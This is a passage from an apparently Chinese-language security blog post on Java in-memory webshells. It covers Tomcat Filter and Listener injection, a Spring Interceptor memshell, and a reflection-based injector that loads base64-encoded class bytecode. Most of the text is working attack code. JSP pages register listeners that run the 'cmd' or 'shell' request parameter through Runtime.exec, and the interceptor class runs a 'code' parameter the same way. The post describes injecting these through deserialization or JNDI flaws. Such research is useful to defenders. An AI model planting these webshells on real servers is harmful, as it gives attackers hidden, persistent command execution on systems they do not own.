filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">    out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">&quot;Injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h2><p>Servlet 和 Filter 是程序员常接触的两个技术，所以在网络上对于之前两小节的讨论较多，对于 Listener 的讨论较少。但实际上这个点还是有很多师傅关注到了。</p>
<p>Listener 可以译为监听器，监听器用来监听对象或者流程的创建与销毁，通过 Listener，可以自动触发一些操作，因此依靠它也可以完成内存马的实现。先来了解一下 Listener 是干什么的，看一下 Servlet API 中的注释。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714113906.png"></p>
<p>在应用中可能调用的监听器如下：</p>
<ul>
<li><code>ServletContextListener</code>：用于监听整个 Servlet 上下文（创建、销毁）</li>
<li><code>ServletContextAttributeListener</code>：对 Servlet 上下文属性进行监听（增删改属性）</li>
<li><code>ServletRequestListener</code>：对 Request 请求进行监听（创建、销毁）</li>
<li><code>ServletRequestAttributeListener</code>：对 Request 属性进行监听（增删改属性）</li>
<li><code>javax.servlet.http.HttpSessionListener</code>：对 Session 整体状态的监听</li>
<li><code>javax.servlet.http.HttpSessionAttributeListener</code>：对 Session 属性的监听</li>
</ul>
<p>可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。而这些类接口，实际上都是 java.util.EventListener 的子接口。这里我们看到，在 <code>ServletRequestListener</code> 接口中，提供了两个方法在 request 请求创建和销毁时进行处理，比较适合我们用来做内存马。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714113906.png"></p>
<p>而除了这个 Listener，其他的 Listener 在某些情况下也可以触发作为内存马的实现，本篇文章里不会对每个都进行触发测试，感兴趣的师傅可以自测。</p>
<p><code>ServletRequestListener</code> 提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 <code>ServletRequestEvent</code> 作为参数，<code>ServletRequestEvent</code> 中又储存了 <code>ServletContext</code> 对象和 <code>ServletRequest</code> 对象，因此在访问请求过程中我们可以在 <code>request</code> 创建和销毁时实现自己的恶意代码，完成内存马的实现。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714114218.png"></p>
<p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。</p>
<p>具体实现如下</p>
<p>过程：</p>
<ul>
<li>创建恶意Listener</li>
<li>将其添加到ApplicationEventListener中去</li>
<li>上传并访问下面这个jsp文件</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) field.get(obj);</span><br><span class="line">  <span class="comment">//获取ApplicationContext</span></span><br><span class="line">  field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) field.get(applicationContext);</span><br><span class="line">  <span class="comment">//获取StandardContext</span></span><br><span class="line">  <span class="type">ListenerDemo</span> <span class="variable">listenerdemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListenerDemo</span>();</span><br><span class="line">  <span class="comment">//创建能够执行命令的Listener</span></span><br><span class="line">  standardContext.addApplicationEventListener(listenerdemo);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerDemo</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;requestDestroyed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;requestInitialized&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e )&#123;</span><br><span class="line">      <span class="comment">//e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>另一种实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="built_in">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a parameter of <span class="string">&quot;shell&quot;</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;shell&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;shell&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line"><span class="type">S</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="built_in">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a parameter of <span class="string">&quot;shell&quot;</span> --&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>反射实现时用的webshell</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.su18.memshell.spring.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> su18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicUtils</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">CONTROLLER_CLASS_STRING</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQALQoABgAeCwAfACAIACEKACIAIwcAJAcAJQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAvTG9yZy9zdTE4L21lbXNoZWxsL3NwcmluZy9vdGhlci9UZXN0Q29udHJvbGxlcjsBAAVpbmRleAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAKRXhjZXB0aW9ucwcAJgEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL0dldE1hcHBpbmc7AQAKU291cmNlRmlsZQEAE1Rlc3RDb250cm9sbGVyLmphdmEBACtMb3JnL3NwcmluZ2ZyYW1ld29yay9zdGVyZW90eXBlL0NvbnRyb2xsZXI7AQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABS9zdTE4DAAHAAgHACcMACgAKQEADXN1MTggaXMgaGVyZX4HACoMACsALAEALW9yZy9zdTE4L21lbXNoZWxsL3NwcmluZy9vdGhlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAACAAEABwAIAAEACQAAAC8AAQABAAAABSq3AAGxAAAAAgAKAAAABgABAAAAEQALAAAADAABAAAABQAMAA0AAAABAA4ADwADAAkAAABOAAIAAwAAAAwsuQACAQASA7YABLEAAAACAAoAAAAKAAIAAAAVAAsAFgALAAAAIAADAAAADAAMAA0AAAAAAAwAEAARAAEAAAAMABIAEwACABQAAAAEAAEAFQAWAAAABgABABcAAAACABgAAAACABkAFgAAABIAAgAaAAAAGwABABxbAAFzAB0=&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">INTERCEPTOR_CLASS_STRING</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAKwoABgAbCwAcAB0IAB4KAB8AIAcAIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAwTG9yZy9zdTE4L21lbXNoZWxsL3NwcmluZy9vdGhlci9UZXN0SW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAKRXhjZXB0aW9ucwcAJAEAClNvdXJjZUZpbGUBABRUZXN0SW50ZXJjZXB0b3IuamF2YQwACAAJBwAlDAAmACcBABBpJ20gaW50ZXJjZXB0b3J+BwAoDAApACoBAC5vcmcvc3UxOC9tZW1zaGVsbC9zcHJpbmcvb3RoZXIvVGVzdEludGVyY2VwdG9yAQAQamF2YS9sYW5nL09iamVjdAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgABAAcAAAACAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAACwAMAAAADAABAAAABQANAA4AAAABAA8AEAACAAoAAABZAAIABAAAAA0suQACAQASA7YABASsAAAAAgALAAAACgACAAAADwALABAADAAAACoABAAAAA0ADQAOAAAAAAANABEAEgABAAAADQATABQAAgAAAA0AFQAWAAMAFwAAAAQAAQAYAAEAGQAAAAIAGg==&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClass(String classCode) <span class="keyword">throws</span> IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException &#123;</span><br><span class="line">		<span class="type">ClassLoader</span>   <span class="variable">loader</span>        <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">		<span class="type">BASE64Decoder</span> <span class="variable">base64Decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>();</span><br><span class="line">		<span class="type">byte</span>[]        bytes         = base64Decoder.decodeBuffer(classCode);</span><br><span class="line"></span><br><span class="line">		<span class="type">Method</span>   <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		Class&lt;?&gt; clz    = loader.getClass();</span><br><span class="line">		<span class="keyword">while</span> (method == <span class="literal">null</span> &amp;&amp; clz != Object.class) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				method = clz.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">				clz = clz.getSuperclass();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">			method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">			<span class="keyword">return</span> (Class&lt;?&gt;) method.invoke(loader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Spring-Interceptor-内存马"><a href="#Spring-Interceptor-内存马" class="headerlink" title="Spring Interceptor 内存马"></a>Spring Interceptor 内存马</h2><p>这里的描述的 Intercepor 是指 Spring 中的拦截器，它是 Spring 使用 AOP 对 Filter 思想的另一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。不过这里将仅仅使用 Spring 中的拦截器进行研究。Intercepor 主要是针对 Controller 进行拦截。</p>
<p>Intercepor 是在什么时候调用的呢？又配置储存在哪呢？这部分比较简单，直接用文字来描述一下这个过程：</p>
<ul>
<li><code>Spring MVC</code> 使用 <code>DispatcherServlet</code> 的 <code>doDispatch</code> 方法进入自己的处理逻辑；</li>
<li>通过 <code>getHandler</code> 方法，循环遍历 <code>handlerMappings</code> 属性，匹配获取本次请求的 <code>HandlerMapping；</code></li>
<li>通过 <code>HandlerMapping</code> 的 <code>getHandler</code> 方法，遍历 <code>this.adaptedInterceptors</code> 中的所有 <code>HandlerInterceptor</code> 类实例，加入到 <code>HandlerExecutionChain</code> 的 <code>interceptorList</code> 中；</li>
<li>调用 <code>HandlerExecutionChain</code> 的 <code>applyPreHandle</code> 方法，遍历其中的 <code>HandlerInterceptor</code> 实例并调用其 <code>preHandle</code> 方法执行拦截器逻辑。<br>通过这次流程我们就清晰了，拦截器本身需要是 <code>HandlerInterceptor</code> 实例，储存在 <code>AbstractHandlerMapping</code> 的 <code>adaptedInterceptors</code> 中。写入非常简单，直接上例子。</li>
</ul>
<p>这种类型的场景：最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们 webshell 逻辑的处理。在 tomcat 容器下，有 filter、listener 等技术可以达到上述要求。那么在 spring 框架层面下，就考虑Interceptor 拦截了</p>
<h3 id="获得当前代码运行时的上下文环境"><a href="#获得当前代码运行时的上下文环境" class="headerlink" title="获得当前代码运行时的上下文环境"></a>获得当前代码运行时的上下文环境</h3><p>参考<a href="https://landgrey.me/blog/12/#top">基于内存 Webshell 的无文件攻击技术研究</a>中的方法  </p>
<h3 id="获取-adaptedInterceptors-属性值"><a href="#获取-adaptedInterceptors-属性值" class="headerlink" title="获取 adaptedInterceptors 属性值"></a>获取 adaptedInterceptors 属性值</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br></pre></td></tr></table></figure>

<h3 id="恶意Interceptor类"><a href="#恶意Interceptor类" class="headerlink" title="恶意Interceptor类"></a>恶意Interceptor类</h3><p>结合漏洞（如反序列化、JNDI注入等）注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//package bitterz.interceptors;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class="line">        <span class="comment">// 避免重复添加</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> adaptedInterceptors.size() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adaptedInterceptors.get(i) <span class="keyword">instanceof</span> TestInterceptor) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已经添加过TestInterceptor实例了&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TestInterceptor</span> <span class="variable">aaa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestInterceptor</span>(<span class="string">&quot;aaa&quot;</span>);  <span class="comment">// 避免进入实例创建的死循环</span></span><br><span class="line">        adaptedInterceptors.add(aaa);  <span class="comment">//  添加全局interceptor</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TestInterceptor</span><span class="params">(String aaa)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (code != <span class="literal">null</span>) &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(code);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            response.sendError(404);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>反射实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.su18.memshell.spring.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.su18.memshell.spring.controller.DynamicUtils.INTERCEPTOR_CLASS_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问此接口动态添加 Interceptor</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> su18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/addInterceptor&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping()</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取当前应用上下文</span></span><br><span class="line">		<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 通过 context 获取 RequestMappingHandlerMapping 对象</span></span><br><span class="line">		<span class="type">RequestMappingHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> mapping.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">		f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		List&lt;HandlerInterceptor&gt; list = (List&lt;HandlerInterceptor&gt;) f.get(mapping);</span><br><span class="line">		list.add((HandlerInterceptor) DynamicUtils.getClass(INTERCEPTOR_CLASS_STRING).newInstance());</span><br><span class="line">		response.getWriter().println(<span class="string">&quot;interceptor added&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

